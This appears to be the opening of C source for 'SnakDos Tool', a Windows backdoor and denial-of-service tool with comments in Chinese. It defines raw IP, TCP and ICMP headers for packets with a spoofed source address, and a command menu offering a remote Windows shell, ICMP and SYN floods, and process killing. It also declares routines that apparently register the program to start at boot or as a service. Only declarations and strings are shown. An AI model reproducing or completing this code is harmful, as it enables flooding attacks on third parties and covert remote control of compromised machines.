#include <winsock2.h> 
#include <ws2tcpip.h> 
#include <stdio.h>
#include <stdlib.h>
#include "psapi.h"
#include "ClassXP.h"
#include "resource.h"
//#pragma comment(lib, "ws2_32.lib") 

#define false 0 
#define true 1 

#define SEQ 0x28376839 
#define CMD_HELP    0
#define CMD_ABOUT    1
#define CMD_EXITP    2
#define CMD_DOS     3
#define CMD_WIN     4
#define CMD_EXITT   5
#define CMD_MESG    6
#define CMD_PROCESS 7


#define FAKE_IP "11.11.11.11" //伪装IP的起始值，本程序的伪装IP覆盖一个B类网段 

#define STATUS_FAILED 0xFFFF //错误返回值 


typedef struct _iphdr //定义IP首部 

{ 

unsigned char h_verlen; //4位首部长度,4位IP版本号 

unsigned char tos; //8位服务类型TOS 

unsigned short total_len; //16位总长度（字节） 

unsigned short ident; //16位标识 

unsigned short frag_and_flags; //3位标志位 

unsigned char ttl; //8位生存时间 TTL 

unsigned char proto; //8位协议 (TCP, UDP 或其他) 

unsigned short checksum; //16位IP首部校验和 

unsigned int sourceIP; //32位源IP地址 

unsigned int destIP; //32位目的IP地址 

}IP_HEADER; 


struct //定义TCP伪首部 

{ 

unsigned long saddr; //源地址 

unsigned long daddr; //目的地址 

char mbz; 

char ptcl; //协议类型 

unsigned short tcpl; //TCP长度 

}psd_header; 


typedef struct _tcphdr //定义TCP首部 

{ 

USHORT th_sport; //16位源端口 

USHORT th_dport; //16位目的端口 

unsigned int th_seq; //32位序列号 

unsigned int th_ack; //32位确认号 

unsigned char th_lenres; //4位首部长度/6位保留字 

unsigned char th_flag; //6位标志位 

USHORT th_win; //16位窗口大小 

USHORT th_sum; //16位校验和 

USHORT th_urp; //16位紧急数据偏移量 

}TCP_HEADER; 


// 定义ICMP首部 
typedef struct _ihdr 
{ 
 BYTE i_type; //8位类型 
 BYTE i_code; //8位代码 
 USHORT i_cksum; //16位校验和 
 USHORT i_id; //识别号 
 USHORT i_seq; //报文序列号 
 ULONG timestamp; //时间戳 
}ICMP_HEADER; 

char szCommand[][8] = 
{
    "HELP",
    "ABOUT",
    "EXITP",
	"DOS",
	"win",
	"EXITT",
	"MESG",
	"PROCESS"
};

// 消息字符串
char szByeT[] = "\r\nShell Thread Exit...\r\nGood luck. Bye-bye!\r\n";
char szICMPbye[] = "\r\nICMP Flood Thread Exit...\r\n";
char szExitT[] = "\r\nExit a Thread...\r\n[1]Shell Thread...\r\n[2]ICMP Flood Thread...\r\n";
char szByeP[] = "\r\nProcess Exit...\r\nGood luck. Bye-bye!\r\n";
char szHelp[] = "\r\nHELP\tHelp for command.\r\nABOUT\tAbout this server.\r\nExitP\tExit Process...\r\nDOS\tDOS Tool~\r\nWin\tA Windows Shell~\r\nExitT\tExit Thread...\r\nMesg\tSend Mesg..\r\nPROCESS\tProcess Relevant operation\r\n";
char szAbout[] = "\r\nSnakDos Tool, Ver 1.0\r\nby RattleSnak CVC/G.B\r\nMy home: http://bbs.logincom.com/bbs/cgi-bin/leoboard.cgi\r\n";
char szUnknown[] = "\r\nSorry, but I cound not understand your command.\r\n";
char szWelcome[] = "\r\nSnakDos Tool,Ver 1.0\r\nType HELP for help.\r\n";
char szDos[] ="\r\nThis is DOS Tool ~!\r\nIt is very dangerous\r\nHope to use prudently\r\n";
char szDosChoice[] ="\r\n[1] ICMP Flood...\t[ip] [Thread]\r\n[2] SYN Flood...\t[ip] [port] [Thread]\r\n";
char szWin[] = "\r\nA Windows Shell~!\r\nPress <Enter> to continue\r\n";
char szMesg[] = "\r\nSend Mesg...\r\n";
char szProRO[] = "\r\nProcess Relevant operation ~~\r\n\r\n[1] Show Process List...\r\n[2] Kill Process...\r\nPlease Input[1--2]:";
char szKillPro[] ="\r\nKill a Process...\r\nPlease Input a PID:"; 
HANDLE hThreadIcmp[1024];
HANDLE hThreadSyn[1024];
HANDLE hProcess;
PVOID pvParam;
DWORD dwThreadID;
char cip[20];
int port = 139;
char *argv[20];
int  help;
int  argc=0;
char *Cargv[20];

int  Cargc=0;
int  icmptnum;
SOCKET sListen;
SOCKET sAccept;
HINSTANCE shInstance;

int cs();
int Mesg();
int RegBoot();
int WinShell();
int DlgMain(HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow);
int DosChoice();
int ProcessRO();
int CmdIcmpDos();
int GetNetArgv();
int ExitThread();
int RegService();
int ProcessList();
int KillProcess();
int SynFloodChoice();
int IcmpFloodChoice();
int GetCmdArgv(PCHAR pCmdlin);
int ParamError(char ErrorCode[1024]);
DWORD WINAPI MesgThread(PVOID pwParam);
DWORD WINAPI TcpListenFun(PVOID pvParam);
DWORD WINAPI ThreadDosSend(PVOID pvParam);
DWORD WINAPI ThreadSynFlood(PVOID pvParam);
LRESULT CALLBACK WndProc (HWND, UINT, WPARAM, LPARAM);
int CALLBACK Dlg_Proc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
